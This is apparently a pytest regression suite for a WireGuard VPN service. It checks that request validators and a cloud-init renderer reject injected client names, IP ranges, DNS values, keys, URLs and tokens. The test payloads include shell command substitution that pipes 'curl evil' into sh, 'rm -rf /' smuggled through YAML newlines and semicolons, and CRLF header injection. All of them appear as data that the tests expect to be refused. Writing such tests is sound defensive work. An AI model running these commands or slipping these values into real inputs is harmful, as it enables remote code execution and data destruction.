"""WireGuard VPN 인젝션 회귀 테스트.

client name/allowed_ips/dns 에 개행·쉘 메타문자·YAML 구조 파괴 시도 문자열이 들어왔을 때
Pydantic validator(app/models/vpn.py)가 422(ValidationError)로 거부하는지 확인한다.
또한 cloud-init 렌더 함수(render_agent_userdata)가 형식이 잘못된 값을 거부하고, 검증된
값을 실행 스크립트 보간 없이 JSON 설정 파일로만 전달하는지 검증한다.

선례: tests/test_cloudinit.py, tests/test_k3s_nodegroup_security.py
"""

import base64
import json

import pytest
import yaml
from pydantic import ValidationError

from waygate.models.schemas import (
    WaygateAgentRegisterRequest,
    WaygateClientCreateRequest,
    WaygateClientUpdateRequest,
    WaygateServerCreateRequest,
)
from waygate.services import waygate_config

# ---------------------------------------------------------------------------
# 악성 페이로드 셋 — 개행/쉘 메타문자/YAML 구조 파괴 시도
# ---------------------------------------------------------------------------

_INJECTION_PAYLOADS = [
    "evil\nruncmd:\n  - rm -rf /",  # 개행 → YAML 구조 주입
    'name"; rm -rf / #',  # 따옴표/세미콜론
    "name$(curl evil|sh)",  # 명령 치환
    "name`id`",  # 백틱 치환
    "name;evil",  # 세미콜론
    "name|evil",  # 파이프
    "name && evil",  # 논리 AND
    "name\r\nSet-Cookie: evil",  # CRLF 주입
]


# ---------------------------------------------------------------------------
# VpnClientCreateRequest.name
# ---------------------------------------------------------------------------


class TestClientNameInjection:
    @pytest.mark.parametrize("malicious", _INJECTION_PAYLOADS)
    def test_malicious_name_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name=malicious)

    def test_valid_name_accepted(self):
        req = WaygateClientCreateRequest(name="my-client-01")
        assert req.name == "my-client-01"

    def test_empty_name_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="")

    def test_name_starting_with_hyphen_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="-leading-hyphen")

    def test_name_over_63_chars_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="a" * 64)


# ---------------------------------------------------------------------------
# VpnClientCreateRequest.allowed_ips
# ---------------------------------------------------------------------------


class TestClientAllowedIpsInjection:
    @pytest.mark.parametrize(
        "malicious",
        [
            "10.0.0.0/24\nruncmd:\n  - rm -rf /",
            "10.0.0.0/24; rm -rf /",
            "10.0.0.0/24$(id)",
            "10.0.0.0/24`id`",
            "not-a-cidr-at-all",
            "300.300.300.300/24",  # 유효하지 않은 IP
        ],
    )
    def test_malicious_allowed_ips_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", allowed_ips=[malicious])

    def test_valid_allowed_ips_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", allowed_ips=["10.8.0.0/24", "192.168.1.0/24"])
        assert req.allowed_ips == ["10.8.0.0/24", "192.168.1.0/24"]

    def test_too_many_allowed_ips_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", allowed_ips=[f"10.{i}.0.0/24" for i in range(21)])

    def test_non_string_allowed_ip_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", allowed_ips=[12345])


# ---------------------------------------------------------------------------
# VpnClientCreateRequest.dns
# ---------------------------------------------------------------------------


class TestClientDnsInjection:
    @pytest.mark.parametrize(
        "malicious",
        [
            "8.8.8.8\nruncmd:\n  - rm -rf /",
            "8.8.8.8; rm -rf /",
            "8.8.8.8$(id)",
            "8.8.8.8`id`",
            "8.8.8.8|evil",
            "evil dns with spaces",
        ],
    )
    def test_malicious_dns_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", dns=malicious)

    def test_valid_ipv4_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns="8.8.8.8")
        assert req.dns == "8.8.8.8"

    def test_valid_hostname_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns="dns.example.com")
        assert req.dns == "dns.example.com"


    def test_none_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns=None)
        assert req.dns is None


# ---------------------------------------------------------------------------
# VpnClientUpdateRequest.name
# ---------------------------------------------------------------------------


class TestClientUpdateNameInjection:
    @pytest.mark.parametrize("malicious", _INJECTION_PAYLOADS)
    def test_malicious_name_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientUpdateRequest(name=malicious)

# ---------------------------------------------------------------------------
# VpnServerCreateRequest.name
# ---------------------------------------------------------------------------


class TestServerNameInjection:
    @pytest.mark.parametrize("malicious", _INJECTION_PAYLOADS)
    def test_malicious_name_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateServerCreateRequest(name=malicious)

    def test_empty_name_generates_default(self):
        """빈 이름은 거부가 아니라 uuid 기반 기본값으로 대체된다."""
        req = WaygateServerCreateRequest(name="")
        assert req.name.startswith("waygate-")


# ---------------------------------------------------------------------------
# VpnAgentRegisterRequest.public_key — WireGuard 키 형식 화이트리스트
# ---------------------------------------------------------------------------
# VpnAgentRegisterRequest.public_key — WireGuard 키 형식 화이트리스트
# ---------------------------------------------------------------------------


class TestAgentPublicKeyInjection:
    @pytest.mark.parametrize(
        "malicious",
        [
            "not-a-valid-wg-key",
            "short=",
            "a" * 44 + "\nruncmd: evil",  # 개행 포함
            "$(curl evil|sh)AAAAAAAAAAAAAAAAAAAAAAAAA=",
        ],
    )
    def test_malicious_public_key_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateAgentRegisterRequest(public_key=malicious)

    def test_valid_public_key_accepted(self):
        # 유효한 X25519 base64 44자 형식
        from waygate.services import waygate_keys

        _, pub = waygate_keys.generate_keypair()
        req = WaygateAgentRegisterRequest(public_key=pub)
        assert req.public_key == pub


# ---------------------------------------------------------------------------
# cloud-init 렌더 — 검증된 값은 agent JSON config로만 전달
# ---------------------------------------------------------------------------

_AGENT_CONFIG_PATH = "/etc/waygate/agent.json"
_VALID_USERDATA = {
    "server_name": "waygate-test",
    "listen_port": 51820,
    "tunnel_cidr": "10.8.0.0/24",
    "register_url": "https://backend.example.com/v1/servers/s1/agent/register",
    "desired_state_url": "https://backend.example.com/v1/servers/s1/agent/desired-state",
    "status_url": "https://backend.example.com/v1/servers/s1/agent/status",
    "bootstrap_token": "safe-token-1234567890",
    "install_packages": True,
}


class TestCloudInitRenderQuoting:
    """render_agent_userdata 의 입력 검증과 설치 모드별 cloud-init 구조를 검증한다."""

    def _decode(self, encoded: str) -> str:
        return base64.b64decode(encoded).decode()

    def _render(self, **overrides) -> dict:
        return yaml.safe_load(self._decode(waygate_config.render_agent_userdata(**(_VALID_USERDATA | overrides))))

    @staticmethod
    def _assert_no_template_markers(document: dict) -> None:
        assert all("{{" not in entry["content"] for entry in document["write_files"])

    def test_userdata_embeds_agent_config_json(self):
        document = self._render()
        entry = next(item for item in document["write_files"] if item["path"] == _AGENT_CONFIG_PATH)

        assert entry["permissions"] == "0600"
        assert json.loads(entry["content"]) == {
            "register_url": _VALID_USERDATA["register_url"],
            "desired_state_url": _VALID_USERDATA["desired_state_url"],
            "status_url": _VALID_USERDATA["status_url"],
            "bootstrap_token": _VALID_USERDATA["bootstrap_token"],
            "listen_port": 51820,
            "tunnel_cidr": "10.8.0.0/24",
            "tunnel_address": "10.8.0.1/24",
            "agent_install_mode": "cloud-init",
        }
        self._assert_no_template_markers(document)

    def test_cloud_init_mode_installs_packages_and_agent_files(self):
        from waygate.services.config_render import AGENT_FILES, agent_asset, agent_packages

        document = self._render()
        written = {entry["path"]: entry for entry in document["write_files"]}

        assert document["package_update"] is True
        assert document["packages"] == agent_packages()
        assert set(written) == {_AGENT_CONFIG_PATH} | {target for _, target, _ in AGENT_FILES}
        for name, target, mode in AGENT_FILES:
            assert written[target]["permissions"] == mode
            assert written[target]["content"] == agent_asset(name)
        self._assert_no_template_markers(document)

    def test_prebuilt_mode_writes_only_agent_config(self):
        cloud_init = self._render()
        prebuilt = self._render(install_packages=False)

        assert "packages" not in prebuilt
        assert "package_update" not in prebuilt
        assert [entry["path"] for entry in prebuilt["write_files"]] == [_AGENT_CONFIG_PATH]
        assert prebuilt["runcmd"] == cloud_init["runcmd"]
        assert json.loads(prebuilt["write_files"][0]["content"])["agent_install_mode"] == "prebuilt"
        self._assert_no_template_markers(prebuilt)

    def test_rejects_bad_tunnel_cidr(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(**(_VALID_USERDATA | {"tunnel_cidr": "10.8.0.0/99"}))

    def test_validate_cloudinit_inputs_rejects_bad_server_name(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(**(_VALID_USERDATA | {"server_name": "evil\nruncmd: rm -rf /"}))

    def test_validate_cloudinit_inputs_rejects_bad_url(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(
                **(_VALID_USERDATA | {"register_url": "not-a-valid-url\nruncmd: evil"})
            )

    def test_validate_cloudinit_inputs_rejects_bad_token(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(**(_VALID_USERDATA | {"bootstrap_token": "tok;rm -rf /"}))

    def test_validate_cloudinit_inputs_rejects_bad_listen_port(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(**(_VALID_USERDATA | {"listen_port": 70000}))

    def test_valid_inputs_render_successfully(self):
        """정상 입력은 예외 없이 렌더되고 base64 로 인코딩된다."""
        yaml_str = self._decode(waygate_config.render_agent_userdata(**(_VALID_USERDATA | {"server_name": "waygate-prod-01"})))
        assert "waygate-prod-01" in yaml_str
        assert "wg-quick@wg0" in yaml_str
